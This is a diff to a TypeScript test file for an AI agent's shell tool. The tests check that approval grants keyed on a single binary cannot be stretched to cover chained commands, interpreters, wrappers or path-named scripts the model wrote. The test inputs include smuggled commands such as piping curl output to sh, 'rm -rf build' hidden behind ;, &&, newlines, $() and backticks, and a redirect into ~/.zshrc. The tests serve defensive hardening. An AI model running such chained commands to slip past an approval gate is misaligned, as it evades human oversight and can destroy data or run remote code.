@@ -4,7 +4,11 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { ApprovalGate } from "../../../approval/approval-gate.js";
 import type { ToolContext } from "../../tool-registry.js";
-import { buildOsShellTool, isOpaqueInterpreterShape } from "./shell.js";
+import {
+  buildOsShellTool,
+  isOpaqueInterpreterShape,
+  shellGrantShape,
+} from "./shell.js";
 
 function approvingTool(defaultTimeoutMs?: number) {
   const gate = new ApprovalGate({
@@ -123,7 +127,7 @@ describe("isOpaqueInterpreterShape (shape-grant suppression)", () => {
   it("withholds [a] for shell interpreters whose danger lives in their args", () => {
     // `bash -c "<anything>"` and friends: the binary name hides what
     // runs, so a shape grant on them would silence arbitrary code.
-    for (const shape of ["bash", "sh", "zsh", "dash", "ksh"]) {
+    for (const shape of ["bash", "sh", "zsh", "dash", "ksh", "pwsh", "cmd"]) {
       expect(isOpaqueInterpreterShape(shape)).toBe(true);
     }
   });
@@ -131,6 +135,44 @@ describe("isOpaqueInterpreterShape (shape-grant suppression)", () => {
   it("allows [a] for ordinary binaries the shape name fully describes", () => {
     for (const shape of ["git", "npm", "ls", "cat", "curl", "rm", "docker"]) {
       expect(isOpaqueInterpreterShape(shape)).toBe(false);
+    }
+  });
+});
+
+describe("shellGrantShape (what an allow-in-chat grant is keyed on)", () => {
+  it("names the bare binary of a call that runs only that binary", () => {
+    expect(shellGrantShape("git", "git status --porcelain", false)).toBe("git");
+    expect(shellGrantShape("GIT", "GIT status", false)).toBe("git");
+    // A pre-joined line with only spaces is still one binary.
+    expect(shellGrantShape("git", "git status", true)).toBe("git");
+  });
+
+  it("has no shape for a subshell line that runs more than its first word", () => {
+    // A `git` grant must not auto-approve these: the line runs curl, sh, rm.
+    for (const line of [
+      "git status && curl -s example.com | sh",
+      "git status; rm -rf build",
+      "git log\nrm -rf build",
+      "git log\r\nrm -rf build",
+      "git log > ~/.zshrc",
+      "git log $(rm -rf build)",
+      "git log `rm -rf build`",
+      "git log & rm -rf build",
+      "git log | sh",
+    ]) {
+      expect(shellGrantShape("git", line, true)).toBeUndefined();
+    }
+  });
+
+  it("has no shape for a binary named by path: it may be a script the model wrote", () => {
+    expect(shellGrantShape("./git", "./git status", false)).toBeUndefined();
+    expect(shellGrantShape("/tmp/x/git", "/tmp/x/git status", false)).toBeUndefined();
+    expect(shellGrantShape("C:\\tools\\git", "C:\\tools\\git status", false)).toBeUndefined();
+  });
+
+  it("has no shape for opaque interpreters and wrappers", () => {
+    for (const bin of ["bash", "sh", "pwsh", "cmd", "env", "xargs", "sudo", "nohup", "timeout"]) {
+      expect(shellGrantShape(bin, `${bin} rm -rf build`, false)).toBeUndefined();
     }
   });
 });
@@ -188,3 +230,43 @@ describe("os.shell.run says when it ran with no arguments (F40)", () => {
     expect(result.summary).not.toContain("ran with no arguments");
   });
 });
+
+describe.skipIf(process.platform === "win32")(
+  "os.shell.run approval preview keeps argument boundaries (ATO-433)",
+  () => {
+    let dir: string;
+
+    beforeEach(async () => {
+      dir = await mkdtemp(join(tmpdir(), "atomic-shell-preview-"));
+    });
+
+    afterEach(async () => {
+      await rm(dir, { recursive: true, force: true });
+    });
+
+    it("quotes the `bash -c` body as one argument, and runs it unchanged", async () => {
+      const previews: string[] = [];
+      const gate = new ApprovalGate({
+        emit: (req) => {
+          previews.push(req.preview ?? "");
+          gate.resolve({ approvalId: req.approvalId, approved: true });
+        },
+      });
+      const tool = buildOsShellTool({ approvals: gate, approvalRequired: true });
+      const result = await tool.run(
+        { cmd: "bash", args: ["-c", "echo 'ux tour' > tour-note.txt"] },
+        {
+          workingDir: dir,
+          sessionId: "test-session",
+          stepIndex: 0,
+          signal: new AbortController().signal,
+        },
+      );
+      expect(previews).toEqual([
+        "bash -c 'echo '\\''ux tour'\\'' > tour-note.txt'",
+      ]);
+      expect(result.status).toBe("ok");
+      expect(await readFile(join(dir, "tour-note.txt"), "utf8")).toBe("ux tour\n");
+    });
+  },
+);
